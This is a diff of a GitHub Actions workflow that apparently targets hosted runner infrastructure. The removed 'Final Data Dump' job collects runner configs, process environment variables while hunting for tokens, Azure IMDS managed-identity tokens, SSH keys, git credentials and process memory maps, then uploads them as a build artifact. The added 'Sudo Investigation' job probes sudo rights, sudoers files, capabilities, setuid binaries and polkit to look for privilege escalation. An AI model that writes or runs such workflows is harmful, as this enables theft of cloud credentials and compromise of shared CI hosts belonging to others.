@@ -1,117 +1,59 @@
-name: Final Data Dump
+name: Sudo Investigation
 on:
   push:
     branches: [master]
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 5
     steps:
       - name: Checkout
         uses: actions/checkout@v4
-      - name: Collect everything
-        continue-on-error: true
-        run: |
-          mkdir -p dist
-          exec > dist/everything.txt 2>&1
-          
-          echo "=========================================="
-          echo "1. /opt/hca/ 全部文件"
-          echo "=========================================="
-          find /opt/hca -type f -exec echo "=== {} ===" \; -exec cat {} \;
+      - run: |
+          echo "=== 1. HCA binary permissions ==="
+          ls -la /opt/hca/hosted-compute-agent
+          getcap /opt/hca/hosted-compute-agent 2>/dev/null || echo "no getcap"
+          stat /opt/hca/hosted-compute-agent
           
           echo ""
-          echo "=========================================="
-          echo "2. Runner 配置目录"
-          echo "=========================================="
-          ls -la /home/runner/actions-runner/
-          find /home/runner/actions-runner -name "*.json" -o -name ".env" -o -name ".runner" -o -name ".agent" 2>/dev/null | while read f; do
-            echo "=== $f ==="
-            cat "$f" 2>/dev/null
-          done
+          echo "=== 2. sudo command permissions ==="
+          ls -la /usr/bin/sudo
+          getcap /usr/bin/sudo 2>/dev/null || echo "no getcap on sudo"
           
           echo ""
-          echo "=========================================="
-          echo "3. 所有进程环境变量（找 token/secret）"
-          echo "=========================================="
-          for pid in 1 $(pgrep -f Runner.Listener) $(pgrep -f Runner.Worker) $(pgrep -f hosted-compute); do
-            [ -n "$pid" ] && [ "$pid" != "1" ] && {
-              echo "--- PID $pid ($(cat /proc/$pid/comm 2>/dev/null)) ---"
-              cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -viE "PATH|HOME|USER|LOGNAME|SHELL|LANG|INVOCATION|JOURNAL|MEMORY" | head -30
-            }
-          done
+          echo "=== 3. Can runner sudo? ==="
+          sudo -n true 2>&1; echo "exit: $?"
+          echo "---"
+          sudo -l 2>&1 | head -20
           
           echo ""
-          echo "=========================================="
-          echo "4. 系统所有 /etc/hosts 和 /etc/resolv.conf"
-          echo "=========================================="
-          cat /etc/hosts
-          cat /etc/resolv.conf
+          echo "=== 4. Check sudoers ==="
+          cat /etc/sudoers 2>/dev/null | head -20 || echo "no sudoers"
+          ls -la /etc/sudoers.d/ 2>/dev/null
+          cat /etc/sudoers.d/* 2>/dev/null | head -20 || echo "no sudoers.d"
           
           echo ""
-          echo "=========================================="
-          echo "5. 所有 network 接口详细信息"
-          echo "=========================================="
-          ip addr show
-          ip route show
-          iptables -L -n 2>/dev/null || echo "no iptables"
+          echo "=== 5. Check HCA capabilities ==="
+          capsh --print 2>/dev/null | head -10
+          cat /proc/$(pgrep -f hosted-compute-agent)/status 2>/dev/null | grep -i cap | head -5
           
           echo ""
-          echo "=========================================="
-          echo "6. Docker 运行中的容器"
-          echo "=========================================="
-          docker ps -a --no-trunc 2>/dev/null
-          docker volume ls 2>/dev/null
+          echo "=== 6. Check systemd service capabilities ==="
+          systemctl cat hosted-compute-agent 2>/dev/null || cat /etc/systemd/system/hosted-compute-agent.service 2>/dev/null
           
           echo ""
-          echo "=========================================="
-          echo "7. Runner diagnostics.json"
-          echo "=========================================="
-          cat /opt/hca/diagnostics.json 2>/dev/null
-          cat /opt/hca/tags 2>/dev/null
+          echo "=== 7. Has setuid? ==="
+          find /opt/hca -type f -perm -4000 -ls 2>/dev/null || echo "no setuid"
           
           echo ""
-          echo "=========================================="
-          echo "8. Azure metadata - 完整"
-          echo "=========================================="
-          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2023-07-01" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -100
+          echo "=== 8. Check polkit ==="
+          ls /usr/share/polkit-1/actions/ 2>/dev/null | head -5
+          cat /var/lib/polkit-1/localauthority/10-vendor.d/* 2>/dev/null | head -20
           
           echo ""
-          echo "=========================================="
-          echo "9. Azure IMDS - managed identity"
-          echo "=========================================="
-          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null
-          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>/dev/null
-          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" 2>/dev/null
+          echo "=== 9. HCA process groups ==="
+          id
+          groups
+          cat /proc/$(pgrep -f hosted-compute-agent)/status 2>/dev/null | grep -E "Uid|Gid|Groups"
           
-          echo ""
-          echo "=========================================="
-          echo "10. HCA logs 目录"
-          echo "=========================================="
-          ls -la /opt/hca/logs/
-          cat /opt/hca/logs/*.log 2>/dev/null | head -50
-          
-          echo ""
-          echo "=========================================="
-          echo "11. 检查 ~/.ssh 和其他隐藏目录"
-          echo "=========================================="
-          ls -la /home/runner/.ssh/ 2>/dev/null
-          ls -la /root/.ssh/ 2>/dev/null
-          find /home/runner -name ".git-credentials" -o -name ".netrc" -o -name "*.pem" 2>/dev/null | head -20
-          
-          echo ""
-          echo "=========================================="
-          echo "12. HCA process memory info"
-          echo "=========================================="
-          HCA_PID=$(pgrep -f hosted-compute-agent)
-          ls -la /proc/$HCA_PID/mem 2>/dev/null
-          cat /proc/$HCA_PID/maps 2>/dev/null | head -30
-          
-          echo ""
-          echo "========== END =========="
-
-      - name: Upload
-        uses: actions/upload-artifact@v4
-        with:
-          name: everything
-          path: dist/
+          echo "=== DONE ==="
